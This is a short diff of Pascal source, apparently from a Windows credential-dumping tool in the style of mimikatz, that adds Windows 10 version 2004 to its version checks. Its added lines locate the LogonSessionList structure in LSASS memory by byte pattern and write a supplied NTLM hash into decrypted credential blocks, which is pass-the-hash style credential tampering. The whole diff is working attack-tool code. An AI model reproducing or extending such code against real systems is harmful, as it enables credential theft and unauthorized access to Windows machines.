@@ -500,6 +500,12 @@ begin
         copymemory(@pattern[0],@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
         patch_pos:=23;
         end;
+     if (pos('-2004',winver)>0)  then //win10
+        begin
+        setlength(pattern,sizeof(PTRN_WN6x_LogonSessionList));
+        copymemory(@pattern[0],@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
+        patch_pos:=23;
+        end;
      end;
   if (lowercase(osarch)='x86') then
         begin
@@ -709,7 +715,8 @@ begin
                                           {$ifdef CPU64}
                                           //log(winver);
                                           if (pos('-1903',winver)>0) or (pos('-1803',winver)>0) or (pos('-1703',winver)>0) or
-                                             (pos('-1909',winver)>0) or (pos('-1809',winver)>0) or (pos('-1709',winver)>0)
+                                             (pos('-1909',winver)>0) or (pos('-1809',winver)>0) or (pos('-1709',winver)>0) or
+                                             (pos('-2004',winver)>0)
                                              then
                                              begin
                                              //log('1903');
@@ -731,7 +738,8 @@ begin
                                           begin
                                           {$ifdef CPU64}
                                           if (pos('-1903',winver)>0) or (pos('-1803',winver)>0) or (pos('-1703',winver)>0) or
-                                             (pos('-1909',winver)>0) or (pos('-1809',winver)>0) or (pos('-1709',winver)>0)
+                                             (pos('-1909',winver)>0) or (pos('-1809',winver)>0) or (pos('-1709',winver)>0) or
+                                             (pos('-2004',winver)>0)
                                              then PCRED_NTLM_BLOCK_1903(@decrypted[0]).ntlmhash:=HexaStringToByte(hash)
                                              else PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash:=HexaStringToByte(hash);
                                           {$endif CPU64}
